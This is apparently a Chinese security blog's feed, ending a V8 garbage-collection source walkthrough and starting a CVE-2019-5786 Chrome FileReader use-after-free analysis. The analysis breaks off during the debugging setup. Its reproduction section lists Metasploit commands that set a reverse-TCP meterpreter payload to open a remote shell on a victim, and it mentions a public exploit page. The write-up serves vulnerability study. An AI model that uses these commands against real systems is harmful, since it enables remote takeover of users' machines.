ResourceEvent(&quot;scavenge&quot;, &quot;end&quot;));</span><br><span class="line"></span><br><span class="line">  SetGCState(NOT_IN_GC);</span><br><span class="line">&#125;</span><br><span class="line"># 观察上面的代码，前面的东西我们不关心，他做了一些准备工作，到后面的时候执行了scavenger_collector_-&gt;CollectGarbage(); 跟进进入到heap\scavenger.cc文件中（注释中告诉我们使用了Cheney&#x27;s copying algorithm）</span><br><span class="line"># 跟进入ScavengerCollector::CollectGarbage()函数，发现每个过程都用块级作用域区分出来了，并标注了注释，这样方便理解了不少</span><br></pre></td></tr></table></figure><h4 id="Scavenger垃圾回收"><a href="#Scavenger垃圾回收" class="headerlink" title="Scavenger垃圾回收"></a>Scavenger垃圾回收</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先建立一个全局的概念，v8官方博客已经描述了使用的相关技术，核心就是更好的利用了多线程，并行Scavenger将标记-复制-修改指针过程变为原子过程，V8使用多线程和负载平衡机制来扫描Root(增量回收)。</span></span><br><span class="line"><span class="comment">// 前面有清除堆的操作，不太懂这里的目的是什么</span></span><br><span class="line"><span class="comment">// 1、Try to finish sweeping here, such that the following code doesn&#x27;t need to pause &amp; resume sweeping.</span></span><br><span class="line"><span class="comment">// 2、Pause the concurrent sweeper.</span></span><br><span class="line"><span class="comment">// 3、Identify weak unmodified handles. Requires an unmodified graph.</span></span><br><span class="line"><span class="comment">// 之后对根进行了复制，主要就是两个函数IterateRoots以及IterateYoungStrongAndDependentRoots</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Copy roots.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_ROOTS);</span><br><span class="line">    <span class="comment">// Scavenger treats all weak roots except for global handles as strong.</span></span><br><span class="line">    <span class="comment">// That is why we don&#x27;t set skip_weak = true here and instead visit</span></span><br><span class="line">    <span class="comment">// global handles separately.</span></span><br><span class="line">    <span class="function">base::EnumSet&lt;SkipRoot&gt; <span class="title">options</span><span class="params">(&#123;SkipRoot::kExternalStringTable,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     SkipRoot::kGlobalHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">                                     SkipRoot::kOldGeneration&#125;)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">V8_UNLIKELY</span>(FLAG_scavenge_separate_stack_scanning)) &#123;</span><br><span class="line">        options.<span class="built_in">Add</span>(SkipRoot::kStack);</span><br><span class="line">    &#125;</span><br><span class="line">    heap_-&gt;<span class="built_in">IterateRoots</span>(&amp;root_scavenge_visitor, options);</span><br><span class="line">    isolate_-&gt;<span class="built_in">global_handles</span>()-&gt;<span class="built_in">IterateYoungStrongAndDependentRoots</span>(</span><br><span class="line">        &amp;root_scavenge_visitor);</span><br><span class="line">    scavengers[kMainThreadId]-&gt;<span class="built_in">Flush</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之后并行移动全部的对象，多线程std::move(memory_chunks)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Parallel phase scavenging all copied and promoted objects.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);</span><br><span class="line">    V8::<span class="built_in">GetCurrentPlatform</span>()</span><br><span class="line">        -&gt;<span class="built_in">PostJob</span>(v8::TaskPriority::kUserBlocking,</span><br><span class="line">                  std::make_unique&lt;JobTask&gt;(<span class="keyword">this</span>, &amp;scavengers,</span><br><span class="line">                                            std::<span class="built_in">move</span>(memory_chunks),</span><br><span class="line">                                            &amp;copied_list, &amp;promotion_list))</span><br><span class="line">        -&gt;<span class="built_in">Join</span>();</span><br><span class="line">    <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">// Parallel phase scavenging all copied and promoted objects.</span></span><br><span class="line">      <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);</span><br><span class="line">      V8::<span class="built_in">GetCurrentPlatform</span>()</span><br><span class="line">          -&gt;<span class="built_in">PostJob</span>(v8::TaskPriority::kUserBlocking,</span><br><span class="line">                    std::make_unique&lt;JobTask&gt;(<span class="keyword">this</span>, &amp;scavengers,</span><br><span class="line">                                              std::<span class="built_in">move</span>(memory_chunks),</span><br><span class="line">                                              &amp;copied_list, &amp;promotion_list))</span><br><span class="line">          -&gt;<span class="built_in">Join</span>();</span><br><span class="line">      <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">      <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Parallel phase scavenging all copied and promoted objects.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_PARALLEL);</span><br><span class="line">    V8::<span class="built_in">GetCurrentPlatform</span>()</span><br><span class="line">        -&gt;<span class="built_in">PostJob</span>(v8::TaskPriority::kUserBlocking,</span><br><span class="line">                  std::make_unique&lt;JobTask&gt;(<span class="keyword">this</span>, &amp;scavengers,</span><br><span class="line">                                            std::<span class="built_in">move</span>(memory_chunks),</span><br><span class="line">                                            &amp;copied_list, &amp;promotion_list))</span><br><span class="line">        -&gt;<span class="built_in">Join</span>();</span><br><span class="line">    <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">V8_UNLIKELY</span>(FLAG_scavenge_separate_stack_scanning)) &#123;</span><br><span class="line">    <span class="built_in">IterateStackAndScavenge</span>(&amp;root_scavenge_visitor, &amp;scavengers,</span><br><span class="line">                            kMainThreadId);</span><br><span class="line">    <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Scavenge weak global handles.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(),</span><br><span class="line">             GCTracer::Scope::SCAVENGER_SCAVENGE_WEAK_GLOBAL_HANDLES_PROCESS);</span><br><span class="line">    isolate_-&gt;<span class="built_in">global_handles</span>()-&gt;<span class="built_in">MarkYoungWeakDeadObjectsPending</span>(</span><br><span class="line">        &amp;IsUnscavengedHeapObjectSlot);</span><br><span class="line">    isolate_-&gt;<span class="built_in">global_handles</span>()-&gt;<span class="built_in">IterateYoungWeakDeadObjectsForFinalizers</span>(</span><br><span class="line">        &amp;root_scavenge_visitor);</span><br><span class="line">    scavengers[kMainThreadId]-&gt;<span class="built_in">Process</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DCHECK</span>(copied_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    <span class="built_in">DCHECK</span>(promotion_list.<span class="built_in">IsEmpty</span>());</span><br><span class="line">    isolate_-&gt;<span class="built_in">global_handles</span>()-&gt;<span class="built_in">IterateYoungWeakObjectsForPhantomHandles</span>(</span><br><span class="line">        &amp;root_scavenge_visitor, &amp;IsUnscavengedHeapObjectSlot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Finalize parallel scavenging.</span></span><br><span class="line">    <span class="built_in">TRACE_GC</span>(heap_-&gt;<span class="built_in">tracer</span>(), GCTracer::Scope::SCAVENGER_SCAVENGE_FINALIZE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DCHECK</span>(surviving_new_large_objects_.<span class="built_in">empty</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; scavenger : scavengers) &#123;</span><br><span class="line">        scavenger-&gt;<span class="built_in">Finalize</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    scavengers.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">HandleSurvivingNewLargeObjects</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MARK-COMPACTOR垃圾回收"><a href="#MARK-COMPACTOR垃圾回收" class="headerlink" title="MARK_COMPACTOR垃圾回收"></a>MARK_COMPACTOR垃圾回收</h4><p>在上面的调试过程达到了case的步骤</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (collector) &#123;</span><br><span class="line">    <span class="keyword">case</span> MARK_COMPACTOR:</span><br><span class="line">        <span class="built_in">MarkCompact</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> MINOR_MARK_COMPACTOR:</span><br><span class="line">        <span class="built_in">MinorMarkCompact</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SCAVENGER:</span><br><span class="line">        <span class="built_in">Scavenge</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我们要分析Major GC，所以自然进入 MarkCompact函数执行</p><p>编写如下代码触发该case</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80000000</span>);</span><br></pre></td></tr></table></figure><p>此时触发了MajorGC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print collector</span><br><span class="line">$1 = v8::internal::MARK_COMPACTOR</span><br></pre></td></tr></table></figure><p>还是先看下整体的流程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 逻辑比较清晰， mark_compact_collector()-&gt;Prepare()进行增量标记环境的创建，MarkCompactPrologue函数清理各个位置的缓存。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Heap::MarkCompact</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">PauseAllocationObserversScope <span class="title">pause_observers</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SetGCState</span>(MARK_COMPACT);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">LOG</span>(isolate_, <span class="built_in">ResourceEvent</span>(<span class="string">&quot;markcompact&quot;</span>, <span class="string">&quot;begin&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="function">CodeSpaceMemoryModificationScope <span class="title">code_modifcation</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">UpdateOldGenerationAllocationCounter</span>();</span><br><span class="line">  <span class="keyword">uint64_t</span> size_of_objects_before_gc = <span class="built_in">SizeOfObjects</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mark_compact_collector</span>()-&gt;<span class="built_in">Prepare</span>();</span><br><span class="line"></span><br><span class="line">  ms_count_++;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">MarkCompactPrologue</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mark_compact_collector</span>()-&gt;<span class="built_in">CollectGarbage</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">LOG</span>(isolate_, <span class="built_in">ResourceEvent</span>(<span class="string">&quot;markcompact&quot;</span>, <span class="string">&quot;end&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">MarkCompactEpilogue</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_allocation_site_pretenuring) &#123;</span><br><span class="line">    <span class="built_in">EvaluateOldSpaceLocalPretenuring</span>(size_of_objects_before_gc);</span><br><span class="line">  &#125;</span><br><span class="line">  old_generation_size_configured_ = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">// This should be updated before PostGarbageCollectionProcessing, which</span></span><br><span class="line">  <span class="comment">// can cause another GC. Take into account the objects promoted during</span></span><br><span class="line">  <span class="comment">// GC.</span></span><br><span class="line">  old_generation_allocation_counter_at_last_gc_ +=</span><br><span class="line">      <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(promoted_objects_size_);</span><br><span class="line">  old_generation_size_at_last_gc_ = <span class="built_in">OldGenerationSizeOfObjects</span>();</span><br><span class="line">  global_memory_at_last_gc_ = <span class="built_in">GlobalSizeOfObjects</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心的标记压缩步骤，这里由于采用了增量垃圾回收，所以采用了三色标记法，使用了迪杰斯特拉的写入屏障。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MarkCompactCollector::CollectGarbage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Make sure that Prepare() has been called. The individual steps below will</span></span><br><span class="line">  <span class="comment">// update the state as they proceed.</span></span><br><span class="line">  <span class="built_in">DCHECK</span>(state_ == PREPARE_GC);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> ENABLE_MINOR_MC</span></span><br><span class="line">  <span class="built_in">heap</span>()-&gt;<span class="built_in">minor_mark_compact_collector</span>()-&gt;<span class="built_in">CleanupSweepToIteratePages</span>();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">// ENABLE_MINOR_MC</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">MarkLiveObjects</span>();<span class="comment">// 这里采用了并发标记与增量标记</span></span><br><span class="line">  <span class="built_in">ClearNonLiveReferences</span>(); <span class="comment">// Clear non-live references in weak cells, transition and descriptor arrays, and deoptimize dependent code of non-live maps.</span></span><br><span class="line">  <span class="built_in">VerifyMarking</span>();<span class="comment">// 验证了活动对象是否被涂黑。跟踪调试发现变量FLAG_verify_heap为false，所以并没有验证。猜测可能特殊情况才需要对标记进行验证保证安全，否则为了效率考虑一般不会多加一个验证的步骤，属实没有必要。</span></span><br><span class="line">  <span class="built_in">heap</span>()-&gt;<span class="built_in">memory_measurement</span>()-&gt;<span class="built_in">FinishProcessing</span>(native_context_stats_);</span><br><span class="line">  <span class="built_in">RecordObjectStats</span>();<span class="comment">// 这里判断对象的状态是否被记录，如果没有则将其记录，调试时发现此时无需记录，函数直接返回。</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">StartSweepSpaces</span>();<span class="comment">// 通过在主线程上贡献并设置其他页面进行扫描来开始扫描空间。 不启动清扫任务。设置的扫描空间为old_space、code_space、map_space。之后执行StartSweeping。StartSweeping函数内部会对对象按照大小进行排序。排序是为了使压缩更有效：通过首先清除具有最多空闲字节的页面，我们更有可能在撤出页面时，已经清除的页面将有足够的空闲字节来容纳要移动的对象（并且 因此，我们不需要等待更多页面被扫描来移动这些对象）。 由于地图不会移动，因此在扫描它们之前无需对 MAP_SPACE 中的页面进行排序。</span></span><br><span class="line">  <span class="built_in">Evacuate</span>();<span class="comment">// 清除阶段的操作。重要函数执行顺序如下：EvacuatePrologue、EvacuatePagesInParallel、UpdatePointersAfterEvacuation、FreeQueuedChunks、EvacuateEpilogue。对new_space和old_space的对象进行压缩最后更新指针。看起来仍是通过GC标记-压缩方式来进行实现的。并未读懂启发式压缩的过程。</span></span><br><span class="line">  <span class="built_in">Finish</span>();<span class="comment">// 调用SweepArrayBufferExtensions，确保young空间和old空间为null。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就算了解了相关的算法知识以及有较为丰富的注释，但观察源代码理解这个庞大的GC过程仍然比较痛苦，尤其是和并发与并行沾上边，而且需要对某些位置进行mutex限制访问，目前对于源代码的分析就简单于此，笔者需要补充自己的实力与经验再去挑战一下v8的GC实现了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>《垃圾回收的算法与实现》                                                                                            // [日]中村成洋    相川光</p><p><a class="link"   href="https://www.cnblogs.com/qqmomery/category/719315.html" >https://www.cnblogs.com/qqmomery/category/719315.html<i class="fas fa-external-link-alt"></i></a>                                    // GC总结</p><p><a class="link"   href="https://www.jianshu.com/p/12544c0ad5c1" >https://www.jianshu.com/p/12544c0ad5c1<i class="fas fa-external-link-alt"></i></a>                                                                // 三色标记法详解</p><p><a class="link"   href="https://juejin.cn/post/6896363424398180359" >https://juejin.cn/post/6896363424398180359<i class="fas fa-external-link-alt"></i></a>                                                        // GC总结</p><p><a class="link"   href="https://juejin.cn/post/6844904161654341646" >https://juejin.cn/post/6844904161654341646<i class="fas fa-external-link-alt"></i></a>                                                        //    v8相关总结</p><p><a class="link"   href="https://time.geekbang.org/column/intro/296?tab=catalog" >https://time.geekbang.org/column/intro/296?tab=catalog<i class="fas fa-external-link-alt"></i></a>                                        // 图解google v8</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;垃圾回收的算法与实现&quot;&gt;&lt;a href=&quot;#垃圾回收的算法与实现&quot; class=&quot;headerlink&quot; title=&quot;垃圾回收的算法与实现&quot;&gt;&lt;/a&gt;垃圾回收的算法与实现&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2019-5786</title>
    <link href="https://fa1lr4in.github.io/2021/05/31/CVE-2019-5786/"/>
    <id>https://fa1lr4in.github.io/2021/05/31/CVE-2019-5786/</id>
    <published>2021-05-31T09:35:20.000Z</published>
    <updated>2021-05-31T13:00:49.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Blink-FileReader-UAF漏洞（CVE-2019-5786）"><a href="#Blink-FileReader-UAF漏洞（CVE-2019-5786）" class="headerlink" title="Blink FileReader UAF漏洞（CVE-2019-5786）"></a>Blink FileReader UAF漏洞（CVE-2019-5786）</h1><h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h3><ul><li>漏洞名称：Blink FileReader UAF漏洞（CVE-2019-5786）</li><li>漏洞编号：CVE-2019-5786</li><li>漏洞类型：UAF</li><li>漏洞影响：远程代码执行</li><li>CVSS3.0：N/A</li><li>CVSS2.0：N/A</li><li>漏洞危害等级：严重</li></ul><h3 id="2、组件和漏洞概述"><a href="#2、组件和漏洞概述" class="headerlink" title="2、组件和漏洞概述"></a>2、组件和漏洞概述</h3><p>Blink是Google基于WebKit fork出的自己的渲染引擎。</p><h3 id="3、相关链接"><a href="#3、相关链接" class="headerlink" title="3、相关链接"></a>3、相关链接</h3><p><a class="link"   href="https://bugs.chromium.org/p/chromium/issues/detail?id=936448" >https://bugs.chromium.org/p/chromium/issues/detail?id=936448<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://chromium.googlesource.com/chromium/src.git/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/" >https://chromium.googlesource.com/chromium/src.git/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/<i class="fas fa-external-link-alt"></i></a></p><h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><p><a class="link"   href="https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html" >https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html<i class="fas fa-external-link-alt"></i></a></p><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>安装72.0.3626.81的Chrome浏览器</p><h3 id="2、复现过程"><a href="#2、复现过程" class="headerlink" title="2、复现过程"></a>2、复现过程</h3><h4 id="（1）msf复现"><a href="#（1）msf复现" class="headerlink" title="（1）msf复现"></a>（1）msf复现</h4><p>1、打开msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/chrome_filereader_uaf</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> URIPATH /</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.126.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2021/05/31/CVE-2019-5786/image-20210514125243955.png" alt="image-20210514125243955"></p><p>2、搭建WIn7 x86环境，安装Chrome在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。访问恶意地址网页。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210514125902439.png" alt="image-20210514125902439"></p><p>3、msf出获得session</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210514125524165.png" alt="image-20210514125524165"></p><h4 id="（2）github公开exp复现"><a href="#（2）github公开exp复现" class="headerlink" title="（2）github公开exp复现"></a>（2）github公开exp复现</h4><p>搭建win 7 sp1 x86漏洞环境，访问漏洞exp页面，复现结果如下。（复现时个人机器访问iframe.html无法成功弹出计算器，直接访问exploit.html才可以成功的进行复现，仅做记录）</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210531153503754.png" alt="image-20210531153503754"></p><h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1、基本信息"><a href="#1、基本信息" class="headerlink" title="1、基本信息"></a>1、基本信息</h3><ul><li>漏洞文件：third_party/blink/renderer/core/fileapi/file_reader_loader.cc</li><li>漏洞函数：FileReaderLoader::ArrayBufferResult()</li><li>编译后漏洞文件：chrome_child.dll</li><li>编译后漏洞函数：blink::FileReaderLoader::ArrayBufferResult()</li></ul><h3 id="2、背景知识"><a href="#2、背景知识" class="headerlink" title="2、背景知识"></a>2、背景知识</h3><h4 id="（0）FileReader对象"><a href="#（0）FileReader对象" class="headerlink" title="（0）FileReader对象"></a>（0）FileReader对象</h4><p>前言：</p><p>HTML5的FileReader API可以让客户端浏览器对用户本地文件进行读取，这样就不再需要上传文件由服务器进行读取了，这大大减轻了服务器的负担，也节省了上传文件所需要的时间。</p><p>下面的内容参考[1]</p><blockquote><p>该**<code>FileReader</code>**对象可以异步读取用户计算机上存储的文件（或原始数据缓冲区）的内容,使用[File]或[Blob]对象指定要读取的文件或数据。Blob对象代表不可变的原始数据的类似文件的对象。它们可以读取为文本或二进制数据，也可以转换为Readable Stream。 Blob可以表示不一定是JavaScript本机格式的数据。 File接口基于Blob，继承了Blob功能并将其扩展为支持用户系统上的文件。File提供有关文件的信息，并允许网页中的JavaScript访问其内容。</p></blockquote><p>FileReader相关的状态[1]如下，EMPTY（还未加载）、LOADING（正在加载）、DONE（加载完成）</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210517115202067.png" alt="image-20210517115202067"></p><p>FileReader有一些内置事件，包括abort、error、load、loadend、loadstart、progress。可以为这些事件自定义处理函数，其中progress事件在读取数据时定期触发，我们可以注册progress事件的回调函数。如果在这时候去获取result，就会在未加载完成时进入FileReaderLoader::ArrayBufferResult函数。如果将要读取的数据的长度设置的稍微大一点，就会在加载的过程中多次回调这个函数。</p><blockquote><p><code>FileReader.onprogress</code><br> A handler for the <code>progress</code> event. This event is triggered while reading a <code>Blob</code> content.<br>        <code>FileReader.onloadstart</code><br> A handler for the <code>loadstart</code> event. This event is triggered each time the reading is starting.</p></blockquote><h4 id="（1）Chrome调试方式"><a href="#（1）Chrome调试方式" class="headerlink" title="（1）Chrome调试方式"></a>（1）Chrome调试方式</h4><p>（1）确定要调试的进程pid</p><p>因为chrome是多进程模式，所以在调试的时候会有多个chrome进程。可以通过打开Chrome本身的任务管理器（shift+esc）来查看相关信息</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210524160855197.png" alt="image-20210524160855197"></p><p>通过打开的标签页可以看到我们具体要操作的是哪个pid，这里假如我们的目标是123这个标签页的话，需要调试的pid则为11708。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210524161055630.png" alt="image-20210524161055630"></p><p>（2）attach process</p><p>之后就是常规的attach操作了，这里就不贴图了。</p><h4 id="（2）符号服务器以及符号文件配置"><a href="#（2）符号服务器以及符号文件配置" class="headerlink" title="（2）符号服务器以及符号文件配置"></a>（2）符号服务器以及符号文件配置</h4><p>（1）Chrome</p><p>Chrome可以配置系统的环境变量来指定相关的符号服务器[2]，具体操作方法为新增环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">变量名：_NT_SYMBOL_PATH</span><br><span class="line">变量值：SRV*c:\symbols*https://msdl.microsoft.com/download/symbols;SRV*c:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com</span><br></pre></td></tr></table></figure><p>（2）Chromium</p><p>Chromium可以下载相关的pdb文件来进行调试，可以通过[3]下载旧版本的Chromium应用程序以及符号文件等，下图链接参考[4]</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210524173059338.png" 